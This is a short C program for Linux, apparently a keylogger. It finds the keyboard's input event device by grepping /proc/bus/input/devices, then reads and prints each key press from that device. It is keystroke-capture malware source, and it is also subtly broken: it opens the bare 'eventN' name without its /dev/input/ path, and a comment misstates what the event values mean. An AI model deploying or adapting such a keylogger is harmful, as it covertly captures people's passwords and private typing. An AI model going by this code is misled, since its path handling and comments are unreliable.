#include <stdio.h>
#include <string.h>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h> // for popen and pclose

int main() {
    const char *cmd = "grep -E 'Handlers|EV=' /proc/bus/input/devices | grep -B1 'EV=120013' | grep -Eo 'event[0-9]+'";
    FILE *pipe = popen(cmd, "r");
    if (pipe == NULL) {
        perror("popen failed!");
        return 1;
    }

    char events[128]; // store the event device path
    if (fgets(events, sizeof(events), pipe) != NULL) {
        events[strcspn(events, "\n")] = '\0'; // remove newline
    } else {
        printf("No event found.\n");
        pclose(pipe);
        return 1;
    }
    pclose(pipe);

    printf("Event device: %s\n", events);

    // Now get stream of data from keyboard events
    int fd = open(events, O_RDONLY);
    if (fd == -1) {
        perror("Can't open the event stream!");
        return 1;
    } else {
        printf("Successfully opened event device: %s\n", events);
    }

    struct input_event ev;
    printf("Keylogger started...\n");
    while (read(fd, &ev, sizeof(struct input_event)) > 0) {
        if (ev.type == EV_KEY && ev.value != 0) { // value can be 1 for press, 2 for release
            printf("Event: type=%d, code=%d, value=%d\n", ev.type, ev.code, ev.value);
        }
    }

    close(fd);
    return 0;
}
